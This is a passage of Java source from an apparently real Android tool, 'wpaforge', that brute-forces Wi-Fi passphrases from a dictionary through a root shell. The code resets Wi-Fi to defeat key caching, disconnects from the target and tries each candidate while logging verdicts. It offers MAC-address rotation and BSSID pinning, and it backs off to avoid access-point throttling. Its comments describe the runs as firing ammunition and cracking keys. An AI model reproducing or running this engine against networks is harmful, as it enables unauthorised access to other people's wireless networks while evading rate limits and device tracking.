            l.onLog(L.f("事件监听器: %s",
                    "event watcher: %s",
                    watcher.isRegistered()
                            ? L.s("已启用（判定可用）", "active (verdict available)")
                            : L.s("启用失败（判定不可用）", "failed to register (verdict unavailable)")));
            l.onLog(L.s("  说明: 判定主链是 `cmd wifi status` 的三条件同行，加上本候选窗口内的",
                    "  Note: the verdict rests on `cmd wifi status` (three conditions on one "
                            + "line) plus the wpa_supplicant lines inside"));
            l.onLog(L.s("  wpa_supplicant 日志。系统回调只用于诊断显示，不参与判定。",
                    "  this candidate's own log window. System callbacks are diagnostics only "
                            + "and do not decide the verdict."));
        } else {
            l.onLog(L.s("事件监听器未初始化",
                    "event watcher not initialised"));
        }

        // **跑之前先自检通道**
        //
        // 设置里显示的模式只是个数字，跟通道能不能用毫无关系。
        // 之前没有这一步，通道断了也照跑 97 条，
        // 全是「未连上」，用户以为是密码不对 —— 这就是他反复遇到的
        // 「明明密码对却识别不到」。
        ChannelProbe probe = probeChannel();
        l.onLog(L.s("── 通道自检 ──", "── channel self-check ──"));
        for (String line : probe.steps) l.onLog("  " + line);
        if (!probe.ok) {
            l.onLog(L.s("✗ 自检未通过，已停止。", "x self-check failed, stopping."));
            l.onBlocked(probe.summary, probe.detail);
            return;
        }
        l.onLog("✓ " + probe.summary);

        // **完整环境诊断** —— 把每一层能测的都测一遍并写进日志。
        //
        // 用户报障时只能看到「没连上」「跳过判定」，不知道卡在哪一层。
        // 判定链有 4 层判据 + 3 种通道，任何一层不通表现都一样。
        // 这里逐项给出结论，界面和日志文件里都有，发出来即可定位。
        try {
            EnvDiagnostics.Report diag = EnvDiagnostics.run(appCtx, mode, shell);
            for (String line : diag.text.toString().split("\n")) {
                l.onLog(line);
            }
        } catch (Throwable t) {
            l.onLog("环境诊断执行失败: " + t.getClass().getSimpleName());
        }

        // ---- 清缓存：重启一次 WiFi ----
        //
        // 为什么要这一步：WPA2 有 PMKSA 缓存（快速重连用的密钥缓存）。
        // 即便 forget 了配置，wpa_supplicant 仍可能在短时间内用缓存密钥
        // 连回同一个 AP —— 此时**用错误密码也会连上**，判定就成了假阳性。
        // 实机复现：正确密码跑成功后，紧接着用错误密码再跑，仍显示「已连上」。
        //
        // 重启 WiFi（off -> on）会强制 wpa_supplicant 重来，缓存被清掉。
        // 只在任务开始时做一次，不影响逐条速度。
        if (shell != null) {
            l.onLog(L.s("清空凭据缓存（防止缓存的旧密钥污染判定）…",
                    "Resetting Wi-Fi (clearing key cache to avoid stale-credential false positives)..."));
            try { shell.exec("cmd wifi set-wifi-enabled disabled", 8000); } catch (Throwable ignored) {}
            sleep(1500);
            try { shell.exec("cmd wifi set-wifi-enabled enabled", 8000); } catch (Throwable ignored) {}
            // 等它起来
            for (int i = 0; i < 20; i++) {
                sleep(500);
                String wprobe = null;
                try { wprobe = shell.exec("cmd wifi status", 4000); } catch (Throwable ignored) {}
                if (wprobe != null && wprobe.contains("Wifi is enabled")) break;
            }
            l.onLog(L.s("缓存已清空，信道重挂完成", "Wi-Fi reset done"));
        }

        // ---- 建立基线 ----
        //
        // **这是修「任何密码都成功」的关键一步**。
        // 如果手机本来就连着目标网络，那么第一条候选一进来就会看到
        // 「当前 SSID == 目标」—— 旧实现据此判成功，于是 12345678、
        // 00000000 全都在第一条“命中”。
        //
        // 所以必须先断开，并**确认真的断开了**，把基线清成「未连接目标」。
        // 之后任何“连上了”才是这条候选的功劳。
        String baseline = snapshotSsid();
        if (target.ssid.equals(baseline)) {
            l.onLog(L.f("锚点校正：当前仍挂在目标 %s，先行脱离…",
                    "Baseline: already connected to %s, disconnecting first...", target.ssid));
            boolean ok = disconnectAndVerify(target.ssid);
            if (ok) {
                l.onLog(L.s("✓ 锚点已固定（当前脱离目标网）",
                        "baseline cleared (not connected to target)"));
            } else {
                l.onLog(L.s("⚠ 脱离失败。",
                        "could not disconnect from the target."));
                l.onLog(L.s("  此时任何密码都会看到「已经连着目标」，",
                        "  Any passphrase would then see already-connected,"));
                l.onLog(L.s("  结果将被标记为「无法确认」而不是成功。",
                        "  and results will be marked UNKNOWN instead of success."));
            }
        } else {
            l.onLog(L.f("锚点：当前挂载 = %s（非目标，可直接开火）",
                    "Baseline: currently on %s (not the target, ready to start)",
                    baseline == null ? L.s("无", "none") : baseline));
        }

        final long basePerItem = timeoutMsPerItem > 0 ? timeoutMsPerItem
                : 10_000L;
        // 自适应窗口（P0 提速）：连续多条「观察窗口结束、无证据」超时后，
        // 说明目标网络不给任何失败/成功证据（典型：手机热点），等满 10 秒
        // 纯属浪费。缩到 6 秒，判定结果不变（都是 TIMEOUT→NONE，不写盘、
        // 不推进游标、不排除候选）。一旦出现任何有证据的结论立即恢复全窗。
        // 正确密码命中不受影响：目标出现在 status 会触发看门狗延长 4 秒。
        long perItem = basePerItem;
        final String security = securityArg(target);
        final int total = candidates.size();
        final int start = Math.max(0, Math.min(startOffset, total));

        int tested = 0;
        int cursor = start;
        int consecutiveNoEvidence = 0;
        String hit = null;
        long beginAt = clock().uptimeMillis();
        // 净尝试耗时：只累计每条候选从发命令到出结论的时间。
        //
        // 不用墙钟（beginAt 到结束）的原因：那段时间里还包含
        // WiFi 重置、基线断开、通道自检这些一次性开销，
        // 摊进「每条耗时」会让预估值被严重高估。
        long pureTryMs = 0L;
        /** 最近若干条的实际耗时（界面上的速率/ETA 用它，而不是被开头慢批次拖住的整轮平均）。 */
        rate.reset();
        // 本轮**结论分布**：已证实失败 / 无结论 必须分开统计 ——
        // 全部无结论时不能说成「未命中」，那是"没证据"，不是"试过了没有"。
        tally.reset();
        /** AP 侧退避检测窗口（连续偏慢就冷却一下，别拿无效尝试硬怼） */
        final BackoffPolicy.Window backoff = new BackoffPolicy.Window();
        /** 每 20 条吐一行耗时汇总（后台跑的日志里唯一能看到快慢的地方） */
        final CostMeter costMeter = new CostMeter(20);
        /** 最近 6 条的判词 —— 没命中时写进日志，让「为什么没判出来」有据可查 */
        final java.util.ArrayDeque<String> recentVerdicts = new java.util.ArrayDeque<>();
        /** 上一行监听器诊断 —— 内容没变就不重复写，免得刷满日志 */
        String lastWatcherLine = null;

        l.onLog(L.f("引擎点火：%s 通道 · 弹药 %d 发 · 单发时限 %.1f 秒",
                "Engine: %s, %d candidates, up to %.1fs each",
                channelName(), total, perItem / 1000.0));

        // 把这一轮**实际会用到的连接参数**写出来。
        // 用户开了「锁定 AP」「更换随机 MAC」却看不到效果时，这一行就是答案：
        // 参数没带上、BSSID 形状不对、开关没生效，都能一眼看出。
        l.onLog(L.s("连接参数: ", "Connect params: ")
                + ConnectSpec.describe(target.ssid, security,
                        pinBssid ? target.bssid : null, macRotate));

        // R6：本次任务的运行标识。只含时间（36 进制）+ 目标 SSID 的哈希前 8 位，
        // 不含 SSID 明文、不含口令 —— 可以安全地写进任务日志。
        currentRunId = presetRunId != null ? presetRunId
                : AttemptId.newRunId(System.currentTimeMillis(), target.ssid, runOrdinal++,
                        bootId());
        presetRunId = null;   // 一次预置只用一次
        l.onLog(L.s("运行标识: ", "run id: ")
                + (currentRunId == null ? "<invalid>" : currentRunId)
                + L.s("（本次任务内每条候选的判词都会带上它）",
                      " (every verdict in this run carries it)"));

        /** 主循环里结论为 INFERRED（证据不足）的候选下标，供补充验证使用。 */
        final java.util.List<Integer> infRetryIdx = new java.util.ArrayList<>();

        try {
            for (int i = start; i < total; i++) {
                if (cancelFlag.get() || pauseFlag.get()) break;

                Candidate c = candidates.get(i);
                tested++;
                testedCount = tested;
                // B3 修复：**游标不在这里推进**。
                // cursor 的语义是「续跑应该从这里开始」，因此只有当这一条真正得到了
                // 可靠结论（DIRECT / INFERRED）时才允许越过它；无结论（TIMEOUT /
                // UNKNOWN / ERROR）必须让 cursor 停在它自己身上，否则进程中断后
                // 续跑会从下一条开始，这条从未被排除的候选被永久漏掉。
                // 进度显示用 cursor 的旧语义由 onAttemptStart 的 index 参数承担。
                l.onAttemptStart(i + 1, total, c.password);

                long itemT0 = clock().uptimeMillis();
                // 序号 = 该候选在字典里的位置（与判词里的顺序号同源）。
                // runId 拿不到时传 null，Attempt 会显式记为无效而不是伪造一个 id。
                // 序号 = 该候选在字典里的位置（1 起）。
                // **不能再用 cursor**：cursor 已改为「安全续跑边界」，
                // 在遇到非 DIRECT 后会停在原地，若拿它当序号，
                // 后续所有候选会共用同一个 seq -> attemptId 非法 -> 日志窗口全失效。
                String aid = currentRunId == null ? null
                        : AttemptId.of(currentRunId, i + 1);
                // 生产：verdictProvider == null，走真实判定链路（规则一字不改）。
                // 测试：由注入的 provider 给出确定性结论，其余逻辑（cursor /
                // 调度 / 记账 / 落盘）仍走同一份生产代码。
                // 自适应窗口：连续多条无证据超时后缩短单发时限（见 adaptiveWindow 注释）。
                perItem = adaptiveWindow(consecutiveNoEvidence, basePerItem);
                VerdictProvider vp = verdictProvider;
                Attempt a = vp != null
                        ? vp.attemptFor(c.password, i + 1)
                        : tryOne(target, security, c.password, perItem, aid);
                if (a == null) {
                    a = new Attempt(c.password, Verdict.ERROR,
                            0L, "provider returned null", "");
                }
                long itemMs = clock().uptimeMillis() - itemT0;
                // 更新「连续无证据」计数：TIMEOUT（观察窗口结束、无证据）累加，
                // 其余任何有结论的 verdict 都清零（说明目标开始给证据，恢复全窗）。
                if (a.verdict == Verdict.TIMEOUT) {
                    consecutiveNoEvidence++;
                } else {
                    consecutiveNoEvidence = 0;
                }

                // 挂起/中断发生在这一条执行到一半 —— 它**没有**得到结论。
                // 不能把它算成「试过了」：cursor 已经推进，续跑时会静默跳过
                // 一条从未真正验证过的候选（漏判）。回退游标，下次重试它。
                // provider 造出的 Attempt 没有 attemptId，这里统一回填，
                // 保证判词与窗口元数据的追溯口径一致。
                if (a.attemptId == null || a.attemptId.isEmpty()) {
                    a.attemptId = AttemptId.wellFormed(aid) ? aid : "";
                }
                if (a.verdict == Verdict.ABORTED) {
                    tested--;
                    testedCount = tested;
                    cursor = i;
                    l.onAttemptResult(a);
                    break;
                }
                // B3 + D5：cursor 是**安全续跑边界**，只在「它之前的候选全部拿到
                // DIRECT 结论」时才允许越过。因此必须同时满足两个条件：
                //   ① 本条是 DIRECT（advancesCursor）
                //   ② cursor 正好等于本条下标（说明前面没有留下未定的候选）
                //
                // 反例（本修复针对的就是它）：
                //   A=INFERRED, B=DIRECT, C=NONE
                //   旧写法处理完 B 时直接 cursor = 2 -> A（index 0）被永久越过。
                //   新写法：A 是非 DIRECT -> cursor 停在 0；B 虽 DIRECT 但
                //   cursor(0) != 1 -> 不推进；C 同理 -> 最终 cursor = 0，
                //   续跑会从 A 重新验证，不会漏掉任何未确认的候选。
                // 记录「证据不足」的候选，供主循环结束后的补充验证使用。
                // 它们既不是确定成功，也不是确定失败 —— 给它们第二次机会。
                if (a.grade == EvidenceGrade.Level.INFERRED) {
                    infRetryIdx.add(i);
                }
                cursor = nextCursor(cursor, i, a.grade);
                pureTryMs += itemMs;
                livePureTryMs = pureTryMs;
                rate.add(itemMs);
                liveRecentAvgMs = rate.avgMs();
                // 结论分布（只统计、不参与判定）
                tally.add(a.verdict, a.grade);

                // 攒够 20 条写一行汇总。四段分解 + 判定归类，
                // 让「后台跑」也有实测数据可看（否则界面一关就全瞎）。
                costMeter.record(itemMs, a.verdict.name(), a.confirmedBy,
                        statPrepMs, statProbeMs, statPollMs, statLogMs, statRounds);
                // 复核补充：把本条候选的**窗口隔离状态**一并写进判词尾巴。
                // 原来 isolated 只进 detail（界面），任务日志里看不到 ——
                // 事后无法回答「这次日志通道到底可不可用、有没有被污染」。
                recentVerdicts.addLast(verdictTag(a.attemptId, cursor, c.password,
                        a.verdict, a.confirmedBy)
                        + L.s("·窗口", "·win")
                        + (a.logWindow == null ? "未采集" : a.logWindow.reason));
                while (recentVerdicts.size() > 6) recentVerdicts.removeFirst();
                String costLine = costMeter.takeSummary();
                if (costLine != null) l.onLog("  " + costLine);

                // 退避检测：**只喂「AP 给了明确结论」的尝试**（见 BackoffPolicy.countable）。
                // 等满超时是本地策略的固定值、通道异常与用户中断也都不是 AP 的响应特征 ——
                // 把它们算进样本，会让「每条都超时」被误读成「连续限流」，越退越慢。
                // 再加一道时间条件：**只有明显快于单发时限的尝试**才反映 AP 的响应速度。
                // 本机错误密码常常是「等到 8~10 秒才有失败信号」，那种耗时是
                // AP 慢 + 本地时限共同决定的，拿来当「变慢」的证据会一直自证。
                if (BackoffPolicy.countable(a.verdict) && itemMs < perItem * 7 / 10) {
                    backoff.record(itemMs);
                }
                long cool = BackoffPolicy.suggestDelayMs(backoff.recent(), backoff.count());
                if (cool > 0) {
                    l.onLog(L.f("目标响应明显变慢（连续 %d 条），冷却 %.1f 秒",
                            "target responding slowly (%d in a row), cooling %.1fs",
                            BackoffPolicy.MIN_SAMPLES, cool / 1000.0));
                    sleep(cool);
                    backoff.reset();
                }

                // 命中即命中 —— 复验只作为**附加信息**，不再一票否决。
                //
                // 为什么改：主判定用的是四层硬证据（状态机日志 / status+netId 绑定 /
                // 网络事件 / WifiInfo），其中 netId 是系统分配的、对不上就不算命中，
                // 归因已经足够严密，不需要靠「断开重连」再来一遍。
                //
                // 而「断开重连」有实际副作用：
                //   · 会打断用户当前的网络（用户明确反馈过）
                //   · 部分路由器/AP 会限制短时间内的快速重连（802.11 关联退避），
                //     于是正确密码也「复验失败」——用户看到的就是「明明连上了却说不算」。
                // 所以复验失败的结论只能说明「无法复现」，不能推翻已经确立的连接事实。
                // 命中即命中，立刻结束 —— **不再做「断开重连」式复验**。
                //
                // 为什么移除复验：
                //   · 主判定用的是四层硬证据（状态机日志 / status+netId 绑定 /
                //     网络事件 / WifiInfo），其中 netId 由系统分配，
                //     对不上就不算命中，归因已经足够严密；
                //   · 复验要「断开再连一次」，会**打断用户当前的网络**；
                //   · 部分路由器/AP 对短时间内的快速重连有退避，正确密码也会
                //     「复验失败」——用户看到的就是「明明连上了却说不算命中」。
                //   综上：收益小、副作用大、还会造成假失败，直接去掉。
                boolean reported = false;
                if (a.isSuccess()) {
                    // 明文口令**不进日志文件**（用户既定决策：明文只允许在命中卡片里
                    // 由用户主动开启）。日志里给可对照的脱敏标签（顺序号 + 哈希前 6 位）。
                    // 复核补齐（2026-10-24）：**命中也是终态结论**，其持久化记录同样要能
                    // 回溯到具体尝试。原实现只在"未命中"时写判词尾巴，命中这行却不带
                    // attemptId → 一次成功破解在文件日志里无法对应到哪一次尝试。
                    l.onLog(L.f("⚡ 密钥命中：%s（证据: %s · 尝试 %s）",
                            "candidate %s connected (via %s, attempt %s)",
                            io.github.wlmosv_png.wpaforge.ui.Redact.pwAt(cursor, c.password),
                            a.confirmedBy,
                            a.attemptId == null || a.attemptId.isEmpty()
                                    ? "<id-invalid>" : a.attemptId));
                    l.onAttemptResult(a);
                    hit = c.password;
                    reported = true;
                    break;
                }

                if (!reported) {
                    l.onAttemptResult(a);
                }

                // 判定失败时把事件摘要打出来。
                // 「没收到事件」和「收到事件但 SSID 对不上」是两种不同故障。
                if (watcher != null && a.verdict != Verdict.SUCCESS) {
                    int n = watcher.eventCount();
                    String wline;
                    if (n == 0) {
                        // 没有事件 —— 把监听器自己的诊断也带上。
                        // 「没注册」「注册了但系统不回调」「回调了但拿不到 SSID」
                        // 是三种完全不同的故障。
                        wline = L.s("  监听器诊断: ", "  watcher: ") + watcher.diagnose();
                    } else {
                        StringBuilder sb = new StringBuilder("  ");
                        sb.append(L.s("事件 ", "events ")).append(n).append(": ");
                        for (NetworkWatcher.Event e : watcher.recent(6)) {
                            sb.append(e.ssid).append(e.available ? "↑" : "↓").append(' ');
                        }
                        wline = sb.toString().trim();
                    }
                    // 降噪：这条诊断每轮都在打，而且内容往往一字不变。
                    // 后台跑时它曾把日志刷满，真正的信息（耗时汇总、判定归类）
                    // 一条都看不见。内容变了才写。
                    if (!wline.equals(lastWatcherLine)) {
                        lastWatcherLine = wline;
                        l.onLog(wline);
                    }
                }

                if (a.verdict == Verdict.TIMEOUT) {
                    consecutiveTimeouts++;
                    if (consecutiveTimeouts == TIMEOUT_ALERT) {
                        // 到期无结论（TIMEOUT）现在有真实生产路径：它既可能是通道问题，
                        // 也可能只是这些候选没给出可归因的证据 —— 两种都要说清楚。
                        l.onLog(L.s(
                                "连续多条「观察窗口结束、无结论」—— 可能是通道没真正生效，"
                                + "也可能是这几条没有产生可归因的证据。"
                                + "请检查授权/权限，或换一种执行方式。",
                                "Several inconclusive attempts in a row - the channel may not "
                                + "be working, or these candidates produced no attributable "
                                + "evidence. Check permissions or switch execution mode."));
                    }
                } else {
                    consecutiveTimeouts = 0;
                }


                // 速率与剩余时间用**最近 20 条的滑窗**，不是整轮平均。
                //
                // 为什么（2026-10-24 实测）：逐条耗时在 2.1~5.7 秒之间摆动 ——
                // 走「系统广播认证失败」这条快速判据的批次约 2 秒/条，
                // 落到「观察窗口结束、无结论」的批次要等满窗口，均值能到 5 秒以上。
                // 整轮平均会把开头的慢批次一直拖着，于是界面显示「每条约 5.2 秒、剩 7 小时」，
                // 而眼下实际只有 2.2 秒/条。滑窗均值才和用户当场的感受一致。
                long winPerItem = rate.avgMs();
                if (winPerItem <= 0) {   // 窗口还空（刚开始）→ 退回整轮平均
                    winPerItem = tested > 0 ? pureTryMs / tested : 0;
                }
                double ratePerSec = winPerItem > 0 ? 1000.0 / winPerItem : 0d;
                long eta = winPerItem > 0 ? (total - start - tested) * winPerItem : -1L;
                // P0 修复（进度恒 0）：进度必须传「实际已尝试数」的绝对位置，
                // 不能传 cursor。cursor 是 D5 的安全续跑边界 —— 只有 DIRECT 推进；
                // 候选普遍落在 INFERRED（观察窗口结束、无归因证据）时 cursor 钉死
                // 在起点，界面就会「已完成 0 / 0.0%」，磁盘 offset 也不涨，
                // 直到任务结束一次性补写。tested 才是「实际试过几条」。
                l.onProgress(start + tested, total, ratePerSec, eta);
                // 续跑边界单独回调：进度显示用 tested，写盘必须用 cursor。
                l.onCursor(cursor);
            }

            // ══════════════════════════════════════════════════════════════
            //  补充验证（第二轮）：只对**证据不足**（INFERRED）的候选重试一次。
            //
            //  为什么需要它：正确密码排在字典靠后时，前面的错误候选已让 AP
            //  进入关联退避，握手变慢，可能在成功证据到达前被 m1retry 结案。
            //  这类结论是「证据不足」而不是「确定失败」，应当有第二次机会。
            //
            //  边界：
            //    · 最多一轮，不形成无限重试；
            //    · 只取 INFERRED，DIRECT / NONE 一律不重试；
            //    · 走完全相同的生产验证链（tryOne 或注入的 provider）；
            //    · 不降低 SUCCESS 判定标准；
            //    · **不推进 cursor、不写永久 triedSet**（沿用 D5 语义）；
            //    · 仍为 INFERRED / NONE 的保持不确定，绝不强制判失败；
            //    · 中断则直接停止，未完成的重试交给下一次运行（cursor 未推进）。
            // ══════════════════════════════════════════════════════════════
            if (hit == null && !cancelFlag.get() && !pauseFlag.get() && !infRetryIdx.isEmpty()) {
                l.onLog(L.f("补充验证：对 %d 条证据不足的候选再试一轮",
                        "Follow-up pass: retrying %d inconclusive candidates",
                        infRetryIdx.size()));
                int retried = 0;
                for (int idx : infRetryIdx) {
                    if (cancelFlag.get() || pauseFlag.get()) break;
                    Candidate c = candidates.get(idx);
                    tested++;
                    testedCount = tested;
                    l.onAttemptStart(idx + 1, total, c.password);
                    String aid2 = currentRunId == null ? null
                            : AttemptId.of(currentRunId, idx + 1);
                    VerdictProvider vp2 = verdictProvider;
                    Attempt a2 = vp2 != null
                            ? vp2.attemptFor(c.password, idx + 1)
                            : tryOne(target, security, c.password, perItem, aid2);
                    if (a2 == null) {
                        a2 = new Attempt(c.password, Verdict.ERROR,
                                0L, "provider returned null", "");
                    }
                    a2.round = 2;   // 标记轮次，便于追溯
                    if (a2.attemptId == null || a2.attemptId.isEmpty()) {
                        a2.attemptId = AttemptId.wellFormed(aid2) ? aid2 : "";
                    }
                    retried++;
                    // 不计入 tally：避免把补充验证混进「已证实失败」的口径统计。
                    // 结果照常通过 onAttemptResult 输出，保留独立记录。
                    l.onAttemptResult(a2);
                    if (a2.isSuccess()) {
                        hit = c.password;
                        break;
                    }
                }
                l.onLog(L.f("补充验证完成：重试 %d 条；未产生新结论的仍保持不确定",
                        "Follow-up pass done: %d retried; inconclusive ones remain inconclusive",
                        retried));
            }
        } finally {
            lastPureTryMs = pureTryMs;
            if (watcher != null) watcher.stop();
            if (authWatch != null) authWatch.stop();
            // 常驻 shell 会话必须显式关掉：否则一轮任务跑完，
            // 后台会留着一个 root shell 进程。
            try { shell.close(); } catch (Throwable ignored) {}
            // 没命中时把最后几条的判词写进**文件日志**。
            // 逐条结果平时只走界面回调，文件里一条都没有 —— 于是「为什么没判出来」
            // 事后完全查不动（2026-10-24 就吃过这个亏）。这里只写一行，不破降噪。
            if (hit == null && !recentVerdicts.isEmpty()) {
                StringBuilder vb = new StringBuilder();
                for (String v2 : recentVerdicts) {
                    if (vb.length() > 0) vb.append(" · ");
                    vb.append(v2);
                }
                l.onLog("  " + L.s("最近判定: ", "recent verdicts: ") + vb);
            }
            // 收尾如实报账（后台跑时这是唯一能看出"到底有多少条真被证实"的地方）
            l.onLog(L.f("本轮结论分布：已证实失败 %d 条 · 无结论 %d 条（共执行 %d 条）",
                    "Verdicts this run: %d confirmed failures, %d inconclusive (%d executed)",
                    tally.confirmedFail(), tally.inconclusive(), tally.executed()));

            String outcome;
            if (hit != null) outcome = "DONE_HIT";
            else if (pauseFlag.get()) outcome = "PAUSED";
            else if (cancelFlag.get()) outcome = "STOPPED";
            else outcome = "DONE_MISS";
            l.onFinished(tested, cursor, hit, outcome);
        }
    }

    /**
     * 上一轮 run() 的净尝试耗时（毫秒）。
     *
     * 只累计每条候选从发命令到出结论的时间，不含 WiFi 重置、
     * 基线断开、通道自检等一次性开销。
     * 供服务层记录实测速率 —— 用墙钟会让预估严重偏高。
     */
    private volatile long lastPureTryMs = 0L;
    /** 运行中的实时累计净尝试耗时（供界面算**本次**速率，不是历史值） */
    private volatile long livePureTryMs = 0L;
    /** 本轮结论分布（已证实失败 / 无结论 / 执行数）—— 供服务写进任务与日志。 */
    private final VerdictTally tally = new VerdictTally();
    /** 最近若干条耗时的滑窗（引擎线程写、界面线程读，只读一个 volatile 快照值）。 */
    private final RateWindow rate = new RateWindow(RateWindow.DEFAULT_SIZE);
    private volatile long liveRecentAvgMs = 0L;

    // ── 每条候选的耗时分解（只为可观测性，**不参与任何判定**）──────────────
    // 后台跑任务时界面没开、UI 回调是空的，逐条结果不会进任务日志 ——
    // 没有这几个数就只能靠猜。20 条汇总一次，写在 run() 里。
    volatile long statPrepMs, statProbeMs, statPollMs, statLogMs;
    volatile int statRounds;
    /** 本轮已试条数（供界面算实时速率） */
    private volatile int testedCount = 0;

    public int testedCount() {
        return testedCount;
    }

    /** 上一轮净尝试耗时（毫秒）；没跑过返回 0。 */
    public long lastPureTryMs() {
        return lastPureTryMs;
    }

    public long livePureTryMs() {
        return livePureTryMs;
    }

    /**
     * 最近 N 条的平均耗时（ms）；没有样本返回 0。
     * <p>界面上的「本次每条约 X 秒」用它 —— 见 {@link RateWindow} 的说明。
     */
    public long liveRecentAvgMs() {
        return liveRecentAvgMs;
    }

    /** 本轮已证实失败的条数（AUTH_FAIL）。 */
    public int confirmedFailCount() {
        return tally.confirmedFail();
    }

    /**
     * 本轮**无结论**的条数 —— 这些条目**不代表密码错**，续跑会重试。
     *
     * <h3>R-12/UI 修复：必须包含全部三类「非证伪」结论</h3>
     * 修复前只返回 {@code tally.inconclusive()}（TIMEOUT/UNKNOWN/INCOMPLETE/
     * TERMINATED_UNKNOWN/ERROR），而下面两类被漏掉：
     * <ul>
     *   <li>{@code NETWORK_AUTH_FAIL}（D1 新增）—— 独立计数，不在 inconclusive 里；</li>
     *   <li>{@code inferred}（AUTH_FAIL 但 grade != DIRECT）—— 独立计数。</li>
     * </ul>
     * 后果正是「界面与真实判定不一致」：一轮里跑出 5 条网络级失败 + 3 条推断失败、
     * 其余全部 DIRECT 时，结果卡会说「这本字典里没有」（implies 已证伪），
     * 而实际上有 8 条根本没被证伪、下次还会重试。
     * 现在统一由本方法给出「未证伪总数」，UI 与 {@code missProven()} 同口径。
     */
    /**
     * 本轮**网络级**认证失败条数（D1 独立分类）。
     *
     * <p>它不是「这条候选错了」，也不是「没结论」—— 是「环境里发生了认证失败」。
     * UI 用它做独立表达（真机实测：错误密码下系统回连其它网络会稳定产生这类事件）。
     */
    public int networkAuthFailCount() {
        return tally.networkAuthFail();
    }

    public int inconclusiveCount() {
        return tally.inconclusive() + tally.networkAuthFail() + tally.inferred();
    }

    /** 「未命中」是否站得住（没有任何无结论条目）。 */
    public boolean missProven() {
        return tally.missProven();
    }

    private String channelName() {
        return "Root";
    }

    /** 连接参数里的加密方式（对 {@code cmd wifi connect-network} 说话的口径）。 */
    public static String securityArg(NetRecord t) {
        switch (t.security) {
            case OPEN: return "open";
            case OWE:  return "owe";
            case WEP:  return "wep";
            case WPA3: return "wpa3";
            default:   return "wpa2";
        }
    }

    public void cancel() { cancelFlag.set(true); }
    public void pause()  { pauseFlag.set(true); }
    public void resume() { pauseFlag.set(false); }
    public boolean isPaused() { return pauseFlag.get(); }
}
